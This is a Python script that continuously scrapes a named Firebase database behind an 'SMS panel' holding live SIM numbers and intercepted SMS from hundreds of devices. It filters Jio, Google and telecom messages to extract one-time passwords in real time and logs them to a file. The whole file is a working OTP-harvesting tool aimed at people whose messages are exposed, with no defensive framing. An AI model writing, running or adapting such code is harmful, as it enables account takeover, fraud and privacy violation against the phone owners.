#!/usr/bin/env python3
"""rtx_c9_watch.py — real-time OTP watcher for the rtx-c9 SMS panel.

The rtx-c9 panel exposes a `users` node with 50 devices, each carrying live
SIM numbers (Sim1/Sim2) refreshed every few minutes, plus a `data` node with
551 devices holding full SMS history.  Jio sign-in OTPs land in `data/<dev>/
smsData` within seconds of being requested.

Watcher loop:
  1. refresh the live mobile list from /users
  2. tail /data/<dev>/smsData for every device
  3. filter for Jio sign-in / Google OTP senders
  4. emit new OTPs to stdout + append to data/rtx_c9_otps_live.jsonl
"""

from __future__ import annotations

import json
import re
import sys
import time
from pathlib import Path

import requests

DATA = Path(__file__).resolve().parent / "data"
BASE = "https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app"
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

# senders that carry a usable OTP
OTP_SENDERS = (
    "JIONET", "JIOFPS", "JIOPAY",
    "G-", "GOOGLE", "GEMINI",
    "AIRTEL", "VODAFONE", "IDEA", "BSNL",
)
# require the number to sit next to OTP wording, never a bare year/dial code
OTP_RE = re.compile(
    r"(?:one[\s\-]?time[\s\-]?password|OTP|verification code|"
    r"security code|login code|is your code|use code|code is)"
    r"[^0-9]{0,40}(\d{4,8})\b",
    re.I,
)
MOBILE_RE = re.compile(r"[6-9]\d{9}")


class RtxWatcher:
    def __init__(self, base: str = BASE):
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": UA})
        self.base = base
        self.seen: set[str] = set()
        self.out = DATA / "rtx_c9_otps_live.jsonl"
        DATA.mkdir(parents=True, exist_ok=True)

    def live_mobiles(self) -> dict[str, str]:
        """mobile -> device_name, from the /users node."""
        try:
            u = self.s.get(f"{self.base}/users.json", timeout=30).json()
        except requests.RequestException:
            return {}
        out = {}
        for dev, v in (u or {}).items():
            if not isinstance(v, dict):
                continue
            for slot in ("Sim1", "Sim2"):
                n = (v.get(slot) or "").replace("+91", "").replace(" ", "").strip()
                if MOBILE_RE.fullmatch(n):
                    out[n] = v.get("device_name", "")
        return out

    def devices(self) -> list[str]:
        try:
            d = self.s.get(f"{self.base}/data.json?shallow=true", timeout=60).json()
            return list((d or {}).keys())
        except requests.RequestException:
            return []

    def device_sms(self, dev: str) -> dict:
        try:
            r = self.s.get(f"{self.base}/data/{dev}/smsData.json", timeout=30)
            if r.status_code == 200 and isinstance(r.json(), dict):
                return r.json()
        except (requests.RequestException, ValueError):
            pass
        return {}

    def scan_once(self) -> list[dict]:
        hits = []
        for dev in self.devices():
            for mid, sms in self.device_sms(dev).items():
                key = f"{dev}:{mid}"
                if key in self.seen:
                    continue
                self.seen.add(key)
                if not isinstance(sms, dict):
                    continue
                sender = (sms.get("sender") or "").upper()
                msg = sms.get("message") or ""
                if not any(x in sender for x in OTP_SENDERS):
                    continue
                m = OTP_RE.search(msg)
                if not m:
                    continue
                row = {
                    "ts": sms.get("time", ""),
                    "dev": dev,
                    "sender": sms.get("sender", ""),
                    "otp": m.group(1),
                    "msg": msg[:220],
                }
                hits.append(row)
                with self.out.open("a") as fh:
                    fh.write(json.dumps(row, ensure_ascii=False) + "\n")
                print(f"[OTP] {row['ts']} {row['sender'][:14]:14s} "
                      f"{row['otp']}  {row['msg'][:90]}")
        return hits

    def run(self, interval: int = 20) -> None:
        print(f"[*] watching {self.base}")
        mob = self.live_mobiles()
        print(f"[*] {len(mob)} live mobiles from /users")
        while True:
            try:
                self.scan_once()
            except KeyboardInterrupt:
                return
            except Exception as exc:  # keep the loop alive
                print(f"[!] {type(exc).__name__}: {exc}")
            time.sleep(interval)


def main() -> int:
    w = RtxWatcher()
    if "--once" in sys.argv:
        hits = w.scan_once()
        print(f"[*] {len(hits)} new OTPs")
        return 0
    w.run(interval=20)
    return 0


if __name__ == "__main__":
    sys.exit(main())
